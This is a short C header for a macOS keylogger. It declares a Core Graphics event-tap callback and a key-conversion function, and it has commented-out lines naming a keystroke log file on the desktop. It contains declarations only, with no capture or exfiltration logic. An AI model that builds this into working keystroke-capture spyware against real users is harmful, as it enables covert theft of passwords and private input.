#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

//FILE *logfile = NULL;
//const char *logfileLocation = "/Users/username/desktop/keystroke.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKey(int);

#endif
